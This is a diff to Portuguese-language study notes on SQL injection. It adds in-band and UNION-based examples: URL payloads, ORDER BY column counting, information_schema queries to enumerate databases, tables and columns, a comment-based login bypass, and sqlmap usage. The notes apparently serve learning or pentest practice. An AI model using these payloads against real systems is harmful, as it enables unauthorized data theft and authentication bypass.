@@ -64,14 +64,30 @@ Exemplo de uso de um banco de dados msql:
    -------------------------------------------------	 TIPOS DE SQLinjection:      ----------------------------------------------------- 
 
 1 ) IN-BAND SQLi (SQLI Clássico)
-	-> feito diretamente na url.
-
+	-> feito diretamente na url 
+	exemplo: 
+	/?q=1' 
+	
+	OPEN BURP SUIT 
+	
+	return 
+	- > exemplo do erro retornado
+		SELECT * FROM teste WHERE ((name LIKE '%'%' OR descriptio blablablabla))
+	
+	- > injeção
+		SELECT * FROM teste WHERE ((name LIKE '%'--))
+		na URL:
+		/?q=%'))--
+	UNION 
+		/?q=%'))+ORDER+BY+1--
+		/?q=%'))+UNION+ALL+SELECT+1,2,3,4--
+			
 
 2 ) Union 
-	- > nesse ataque o atacante vai unir ( combinar ) diferentes injeções 
+	-> nesse ataque o atacante vai unir ( combinar ) diferentes injeções 
 	exemplo: 
 		fazendo injeção na url 
-		cat.php?id = 1 order by 1-- ( -- é um comentário ) 
+		cat.php?id = 1+ORDER+by+1-- ( -- é um comentário ) 
 		cat.php?id = 1 order by 2--
 		order by ( ordene pela coluna )
 		ordene pela coluna by x* até retornar: Unknown column 'x*' in 'order clause' ( assim, você saberá quantas colunas aquele banco de dados possui ) 
@@ -84,7 +100,7 @@ Exemplo de uso de um banco de dados msql:
 	2 ) use algumacoisa1; ( use o banco de dados escolhido ) 
 	3 ) show tables; ( mostre as tabelas que o banco escolhido possui ) 
 	
-	- > select * from users where teste="emails"; 				- > select * from users order by 2 
+	-> select * from users where teste="emails"; 				- > select * from users order by 2 
 		return 									return
 		
 		id teste				      	OR  			id teste 
@@ -121,9 +137,13 @@ Exemplo de uso de um banco de dados msql:
 	------------------------------------------------------------------------------------------------------------------------------------------
 	- > Descobrir o nome do banco de dados, tabelas e colunas usando ataque em union ( combinação de parâmetros )
 		- 1 union select 2, database() 
+		
 		- 1 union select 2, schema_name from information_schema.schemata
+		
 		- 1 union select 2, group_concat(schema_name) from information_schema.schemata retorna todos os bancos de dados ( se não retornar, o 		atacante não tem privilégios suficientes para fazer )   
+		
 		-1 union select 2, group_concat(table_name) from information_schema.tables where table_schema="nome do bancoc" ( retorna tabelas do que o banco de dados possui ) 
+		
 		-1 union select 2, group_concat(column_name) from information_schema.columns where table_schema="nome do bancoc" and table_name="tabela"
 	
 	- > após saber o nome do banco de dados, tabelas e colunas podemos retornar ao ataque union e combinar parâmetros:
@@ -239,8 +259,15 @@ Exemplo de uso de um banco de dados msql:
 	
 	sqlinjection sem precisar passar um header: 
 	sqlmap -u site --forms --dbms=(nome do banco de dados) --dbs 
-
-
+	Fazendo requisição de SQLinjection na prática em formulários:
+		- >  SELECT * FROM Users WHERE usuario = 'teste@teste.com'-- AND password = 'senha';
+	
+	Com injeção: 
+		- > usuario: teste@teste.com'-- 
+	Como seria a requisição com injeção: 
+		- > SELECT * FROM Users WHERE usuario = 'teste@teste.com''--;
+		( AND passowrd é comentado pelo -- 
+	
 	       ------------------------------------  Manipulando headers para SQLinjection  -------------------------------------
 
 	#https://en.wikipedia.org/wiki/List_of_HTTP_header_fields
